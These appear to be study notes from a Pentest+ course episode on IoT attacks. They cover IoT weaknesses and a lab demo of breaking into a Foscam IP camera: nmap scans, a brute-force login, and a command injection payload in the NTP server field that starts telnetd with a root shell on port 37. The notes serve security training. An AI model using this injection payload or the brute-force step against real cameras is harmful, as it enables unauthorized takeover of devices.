    acking.md
    Show Name: Pentest+ (PT0-002)
    Topic Name: Attacks and Exploits
    Episode Name: IoT Attacks

# NOTE: The foscam bash script is a class example Daniel created to break into the webcam he has on the show for this episode. 
# NOTE: HE LOOKED UP THE DEVICE AND FOUND WHAT THE COMMON VULNS ARE TO THIS SPECIFIC DEVICE. YOU WILL HAVE TO DO THE SAME!
================================================================================
IoT Attacks
Objectives:

    List and describe IoT vulnerabilities and explain how they can be leveraged against an organization

    Special Considerations
        Fragile Environment
        Availability Concerns
        Data Corruption
        Data Exfiltration

    Vulnerabilities
        Insecure Defaults
        Clear-Text Communication
        Hard-Coded Configurations
        Outdated Firmware/Hardware
        Data Leakage
        Use of Insecure or Outdated Components

    Demo: Hacking an IP Camera
        nmap ping scan subnet 
- $ nmap -sn -T5 192.168.2.0/24
#Example Results
192.168.2.1
192.168.2.2
192.168.2.3
192.168.2.4
192.168.2.6

# this will give us ALL hosts/machines/boxes on the network
- $ nmap -T5 -n -Pn 192.168.2.2
#Example Results
PORT		STATE		SERVICE
88/tcp		open		kerberos-sec
443/tcp		open		https
888/tcp		open		accessbuilder

#NOTE: Remember to run a full port scan '-p-' never want to miss the obscure ports in a test


-$ nmap -A -T5 -n -Pn -p 88,443 192.168.2.2        

	nmap scan foscam

        Try to login to foscam web portal

        Brute-force creds using foscam-brute.sh

        Login to foscam

# This foscam-brute.sh is brute force login script for the login 

        Basic Settings > Camera Time

- Soonce we get loggin we do...

            Use dev tools to modify NTP server name to be ...
	He opens the developer tools and does a find/lookup for timenist.gov
	He found a timezone command that was being sent to the backend server. 
	As it is reaching out to an NTP server we are going use command injection to inject the command below 
	
-                ;/usr/sbin/telnetd -p37 -l /bin/sh;		# this command is saying start up a telnet server on port 37  then we tell it what to listen with on the other end which in this case is a bash shell
- once the command injection is injected on to the end of the time command in the page. we simple hit save and refresh the page which executes the code, which starts the telnet server.
- we pop over to another terminal and telnet in.  $ telnet 192.168.2.2 37

- we are then greated with a root shell





